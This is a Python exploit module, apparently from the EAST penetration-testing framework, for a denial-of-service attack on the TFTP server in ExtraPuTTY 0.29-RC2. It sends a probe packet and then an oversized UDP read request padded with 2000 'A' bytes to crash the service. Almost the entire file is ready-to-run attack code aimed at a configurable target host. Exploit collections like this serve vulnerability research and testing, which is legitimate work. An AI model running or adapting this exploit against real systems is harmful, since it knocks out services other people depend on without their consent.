#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import socket
import struct

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_extraputty_tftp_dos"
INFO['DESCRIPTION'] = "ExtraPuTTY 0.29-RC2 - Denial of Service"
INFO['VENDOR'] = "http://www.extraputty.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/41639/']
INFO["CVE Name"] = ""
INFO["NOTES"] = """ TFTP server component of ExtraPuTTY is vulnerable to remote Denial of Service attack by sending large junk UDP
Read/Write TFTP protocol request packets
"""
INFO['CHANGELOG'] = "21 Mar, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Dos/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 69, dict(description = 'Target port')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))

        payload = '\x00\x01' + 'A' * 2000 + '\x00netascii\x00'
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.sendto("\x00\x01\TEST\x00\netascii\x00", (self.host, self.port))
            recv = s.recvfrom(255)
            if recv != None:
                self.log("Send payload to ExtraPuTTY TFTP server")
                s.sendto(payload, (self.host, self.port))
        except Exception as e:
            self.log('Server not available')
            self.finish(False)
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
